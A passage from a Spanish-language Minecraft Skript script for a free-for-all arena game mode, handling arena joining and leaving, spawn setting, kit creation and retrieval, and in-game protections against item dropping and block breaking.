																	send "&cUso /ffa %arg 1% %arg 2% %arg 3% <nombre>" to the player
																else:
																	if player has permission "ffa.admin.arena.tp":
																		teleport the player to {arenaspawn::%arg 4%}
																		send "&aHas sido teletransportado correctamente, y ahora puedes modificar el terreno, y no te harás daño" to the player
																	else:
																		send "&cNo tienes el permiso ffa.admin.arena.tp" to the player
											else:
												if arg 2 is "setspawn":
													if player has permission "ffa.admin.setspawn":
														set {serverspawn} to player's location
														send "&eSpawn establecido. Iniciando prueba de TP en 5 segundos (muevete para probarlo)" to the player
														wait 5 seconds
														teleport the player to {serverspawn}
														send "&aTeletransportando a spawn general y principal" to the player
				else:
					if arg 1 is "kit":
						if arg 2 is not set:
							send "&cUso: /ffa kit <kit>" to the player
						else:
							make the player execute "/cogerkit %arg 2%"
					else:
						if arg 1 is "entrar":
							if arg 2 is not set:
								send "&cUso: /ffa entrar <arena>" to the player
							else:
								set {arena_unido::%player%} to "%arg 2%"
								teleport the player to {arenaspawn::%arg 2%}
								wait 10 tick
								add 1 to {jugadorestotal::%{arena_unido::%player%}%}
								execute player command "/cogerkit %arg 2%"
						else:
							if arg 1 is "salir":
								if {arena_unido::%player%} is set:
									remove 1 from {jugadorestotal::%{arena_unido::%player%}%}
									wait 1 tick
									delete {arena_unido::%player%}
									wait 10 tick
									teleport the player to {serverspawn}
									clear player's inventory
									send "&cAbandonastes la arena correctamente" to the player
								else:
									send "&cNo estas en ninguna arena" to the player
							else:
								if arg 1 is "top":
									loop {kills::*}:
										stop
								else:
									if player has permission "ffa.user.mirarkills":
										if {kills::%arg 1%} is set:
											send "%{prefijo}%%{mensajemirarkills1}%%{kills::%arg 1%}%%{mensajemirarkills2}%"
										else:
											send "%{prefijo}%%{nuncaentro}%" to the player
									else:
										send "%{prefijo}%%{noperms}%" to the player
		else:
			broadcast "[FFA base] &4&lNO ESTA ACTIVADO (/licencia <codigo>)"
on damage:
	if {arena_unido::%victim%} is "%{arena_unido::%attacker%}%":
		stop
	else:
		if {arena_unido::%victim%} is not "%{arena_unido::%attacker%}%":
			send "&cEse jugador no esta en tu arena. Reportando error a los administradores actuales" to the attacker
			send "&4&lESTAS EN UNA ARENA INCORRECTA O EL ATACANTE ESTA EN UNA ARENA INCORRECTA" to the victim
			loop all players:
				if loop-player has permission "ffa.admin.notificar":
					send "&4Error &lGRAVE&7>> &eEl jugador &b%victim% &eno esta en la arena correcta, o &b%attacker%&e no esta en la arena correcta." to the loop-player
					send "&eArena de &b%attacker%: &c%{arena_unido::%attacker%}%" to the loop-player
					send "&eArena de &b%victim%: &c%{arena_unido::%victim%}%" to the loop-player
		else:
			if {arena_unido::%victim%} is not set:
				send "&cEstas atacando a un jugador que no esta jugando. Puede ser que sea administrador y este haciendo modificaciones." to the attacker
				cancel event
on drop:
	if {arena_unido::%player%} is set:
		send "&cNo puedes dropear nada en juego" to the player
		cancel event
	else:
		if player is op:
			stop
on break:
	if {arena_unido::%player%} is set:
		if {rompercooldown::%player%} is not set:
			set {rompercooldown::%player%} to 1
			cancel event
			send "&c¡¡No puedes romper nada!! ¡¡Estas en juego!!" to the player
			wait 15 seconds
			delete {rompercooldown::%player%}
		else:
			cancel event
	else:
		if player has permission "ffa.admin.arena.editar":
			stop
		else:
			send "&cNo tienes el permiso 'ffa.admin.arena.editar'" to the player
			cancel event
command /crearkit [<text>]:
	permission: ffa.admin.kit.crear
	permission message: &cNo tienes acceso a usar esto
	trigger:
		if {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} is 1:
			if arg 1 is not set:
				send "&cUso: /crearkit <arena>" to the player
			else:
				if {inv.helmet.main.%arg 1%} is set:
					send "&cEse kit ya existe. Usa /delkit %arg 1% para borrarlo antes"
				else:
					set {_count} to 0
					loop 36 times:
						set {inv.%{_count}%.main.%arg 1%} to slot {_count} of player's inventory
						#message "{inv.%player%.%{_count}%.main.%arg 1%} es %{inv.%{_count}%.main.%arg 1%}%"
						add 1 to {_count}
						send "&aSLOT %{_count}% guardado     &7(slot %{_count}% es %{inv.%{_count}%.main.%arg 1%}%" to the player
					set {inv.helmet.main.%arg 1%} to player's helmet
					set {inv.chest.main.%arg 1%} to player's chestplate
					set {inv.legs.main.%arg 1%} to player's leggings
					set {inv.feet.main.%arg 1%} to player's boots
					wait 10 tick
					clear player's inventory
					send "&aKit creado" to the player
		else:
			broadcast "[FFA base] &4&lNO ESTA ACTIVADO (/licencia <codigo>)"
command /cogerkit [<text>]:
	permission: ffa.user.kit
	permission message: &cNo puedes usar esto
	trigger:
		if {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} is 1:
			if arg 1 is not set:
				send "&cUso: /cogerkit <arena>" to the player
			else:
				if {inv.helmet.main.%arg 1%} is not set:
					send "&cEse kit no existe!" to the player
				else:
					clear player's inventory
					wait 5 tick
					loop 36 times:
						set slot {_count} of player's inventory to {inv.%{_count}%.main.%arg 1%}
						add 1 to {_count}
					set the helmet of player to {inv.helmet.main.%arg 1%}
					set the chestplate of player to {inv.chest.main.%arg 1%}
					set the leggings of player to {inv.legs.main.%arg 1%}
					set the boots of player to {inv.feet.main.%arg 1%}
					show mob spawner flames at the player
					show mob spawner flames at the player
					show mob spawner flames at the player
		else:
			broadcast "[FFA base] &4&lNO ESTA ACTIVADO (/licencia <codigo>)"
command /borrarkit [<text>]:
	permission: ffa.admin.kit.borrar
	permission message: &cNo puedes usar esto
	trigger:
		if arg 1 is not set:
			send "&cUso: /borrarkit <arena>" to the player
		else:
			if {inv.helmet.main.%arg 1%} is not set:
				send "&cEse kit no existe!" to the player
			else:
				loop 36 times:
					delete {inv.%{_count}%.main.%arg 1%}
					add 1 to {_count}
				delete {inv.helmet.main.%arg 1%}
				delete {inv.chest.main.%arg 1%}
				delete {inv.legs.main.%arg 1%}
				delete {inv.feet.main.%arg 1%}
				send "&cKit &4borrado &acorrectamente" to the player
